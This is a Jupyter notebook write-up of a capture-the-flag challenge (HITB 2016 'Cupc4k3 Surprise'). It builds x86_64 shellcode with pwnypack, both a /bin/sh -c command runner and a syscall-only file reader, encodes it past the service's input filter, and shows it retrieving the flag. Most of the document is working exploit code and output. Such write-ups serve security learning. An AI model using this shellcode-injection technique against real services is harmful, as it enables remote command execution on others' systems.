{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Introduction\n",
    "\n",
    "This is a write-up of the pwnable challenge (Cupc4k3 Surprise) of the HITB 2016 Teaser CTF. Here's the original description of the challenge:\n",
    "\n",
    "> Pastries have been the driving force in culinary innovation for centuries. And no pastry type\n",
    "> has pushed the boundries further or faster than the iconic Cupcake. Today, you will show us\n",
    "> your skill and creativity by creating a truely orginal Cupcake, using nothing but the ingredients\n",
    "> in our specially prepared Cupcake Bakery. You can find the Cupcake Bakery at 52.17.31.229:31337.\n",
    "> We will even give you a layout of the bakery.\n",
    "\n",
    "Download the [binary](910abf341053d25831ecb465b7ddf738). TL;DR: download the [exploit](pwnc4k3.py)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's start by some python 2/3 compatibility preamble and defining a way to connect to the bakery. Adjust as required."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "from __future__ import print_function\n",
    "import six\n",
    "\n",
    "\n",
    "def connection_factory(echo=False):\n",
    "    # Connect to the bakery (no longer available):\n",
    "    # return Flow.connect_tcp('52.17.31.229', 31337, echo=echo)\n",
    "\n",
    "    # If you want to use the local executable, use:\n",
    "    return Flow.execute('./910abf341053d25831ecb465b7ddf738', echo=echo)\n",
    "\n",
    "    # Or, via ssh (I've got a virtual machine set up for this):\n",
    "    # return Flow.execute_ssh('./910abf341053d25831ecb465b7ddf738', '127.0.0.1', 2224, echo=echo)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's see what this cupcake is made of."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "RELRO    CANARY  NX   PIE  RPATH  RUNPATH  FORTIFIED  PATH\n",
      "Partial  Yes     Yes  No   No     No           0/4/4  910abf341053d25831ecb465b7ddf738\n"
     ]
    }
   ],
   "source": [
    "%checksec 910abf341053d25831ecb465b7ddf738"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's prepare our environment. We let pwnypack assume the target of the executable and create a shellcode environment for 64bit Linux."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "target.assume(ELF('910abf341053d25831ecb465b7ddf738'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we'll need some code to execute on the remote machine. Using pwnypack's shellcode engine (the 64bit Linux flavor) we can easily assemble shellcode that allows us to run any command by invoking /bin/sh -c _command_."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "@sc.LinuxX86_64Mutable.translate()\n",
    "def build_shellcode_shell(system_cmd):\n",
    "    sys_execve(\n",
    "        u'/bin/sh',\n",
    "        [u'/bin/sh', u'-c', system_cmd, None],\n",
    "        None\n",
    "    )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Or, to make things a bit more interesting on the shellcode side, let's create some shellcode that prints the content of a file using only syscalls."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "@sc.LinuxX86_64Mutable.translate()\n",
    "def build_shellcode_cat(path):\n",
    "    buf = alloc_buffer(64)\n",
    "    R13 = sys_open(path, 0, 0)\n",
    "    R14 = sys_read(R13, buf, buf.length)\n",
    "    sys_write(1, buf, R14)\n",
    "    sys_close(R13)\n",
    "    sys_exit(0)\n",
    "\n",
    "# You could also write:\n",
    "@sc.LinuxX86_64Mutable.translate()\n",
    "def build_shellcode_cat_1(path):\n",
    "    buf = alloc_buffer(64)\n",
    "    R13 = sys_open(path, 0, 0)\n",
    "    sys_write(1, buf, sys_read(R13, buf, buf.length))\n",
    "    sys_close(R13)\n",
    "    sys_exit(0)\n",
    "\n",
    "# Or, since there's no real need to close the file:\n",
    "@sc.LinuxX86_64Mutable.translate()\n",
    "def build_shellcode_cat_2(path):\n",
    "    buf = alloc_buffer(64)\n",
    "    sys_write(1, buf, sys_read(sys_open(path, 0, 0), buf, buf.length))\n",
    "    sys_exit(0)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "As the cupcake engine adds the random value and each byte of the ingredient, we can create a function that encodes a byte by subtracting the random value and the ascii indices of the ingredient itself. Since we can't send NUL bytes or carriage return characters and other control characters look really strange we use a special encoding for those."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def encode_byte(random_value, ch):\n",
    "    v = (ch - random_value - sum(map(ord, u'EGG'))) & 0xff\n",
    "    if v == 0:\n",
    "        return b'EGG'\n",
    "    elif v < 32:\n",
    "        return b'EGG' + P8(128) + P8(v + 128)\n",
    "    else:\n",
    "        return b'EGG' + P8(v)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Next, we create a function that builds shellcode to execute a given command (it calls /bin/sh -c {command}), reads the oven temperature and determines the random value that is used. It then adds an ingredient for each byte of shellcode."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {
    "collapsed": false
   },
   "outputs": [],
   "source": [
    "def bake(system_cmd, debug=False):\n",
    "    if system_cmd:\n",
    "        shellcode = build_shellcode_shell(system_cmd)\n",
    "    else:\n",
    "        shellcode = build_shellcode_cat(u'YOU_WANT_THIS_ONE')\n",
    "\n",
    "    if debug:\n",
    "        print()\n",
    "        print('Assembled shellcode length:', len(shellcode))\n",
    "        print(repr(shellcode))\n",
    "\n",
    "    f = connection_factory()\n",
    "\n",
    "    f.until(b'0v3n w4rm3d up to ')\n",
    "    random_value = int(f.readline().split(b' ')[0]) // 0x1337\n",
    "\n",
    "    f.until(b'add ingredient> ')\n",
    "    for ch in six.iterbytes(shellcode):\n",
    "        f.writeline(encode_byte(random_value, ch))\n",
    "        f.until(b'add ingredient> ')\n",
    "\n",
    "    if debug:\n",
    "        print()\n",
    "        print('Output:')\n",
    "    f.writeline(b'BAKE')\n",
    "    f.read_eof(echo=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And now, let's bake a cupcake!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Assembled shellcode length: 72\n",
      "'H\\x8d- \\x00\\x00\\x00H1\\xd2H1\\xc0PUH\\x8dE\\x16PH\\x8dE\\x19PH\\x89\\xe6H\\x8d}\\x19\\xb8;\\x00\\x00\\x00\\x0f\\x05cat YOU_WANT_THIS_ONE\\x00-c\\x00/bin/sh\\x00'\n",
      "\n",
      "Output:\n",
      "\u001b[0mhitb{BLABLABLA}\n"
     ]
    }
   ],
   "source": [
    "bake(u'cat YOU_WANT_THIS_ONE', True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "collapsed": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Assembled shellcode length: 103\n",
      "'H\\x8d-N\\x00\\x00\\x00H1\\xd2H1\\xf6H\\x89\\xef\\xb8\\x02\\x00\\x00\\x00\\x0f\\x05I\\x89\\xc5\\xba@\\x00\\x00\\x00H\\x8du\\x12L\\x89\\xefH1\\xc0\\x0f\\x05I\\x89\\xc6L\\x89\\xf2H\\x8du\\x12\\xbf\\x01\\x00\\x00\\x00\\xb8\\x01\\x00\\x00\\x00\\x0f\\x05L\\x89\\xef\\xb8\\x03\\x00\\x00\\x00\\x0f\\x05H1\\xff\\xb8<\\x00\\x00\\x00\\x0f\\x05YOU_WANT_THIS_ONE\\x00'\n",
      "\n",
      "Output:\n",
      "\u001b[0mhitb{BLABLABLA}\n"
     ]
    }
   ],
   "source": [
    "bake(None, True)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "pwnypack (Python 2)",
   "language": "python",
   "name": "pwnypack"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
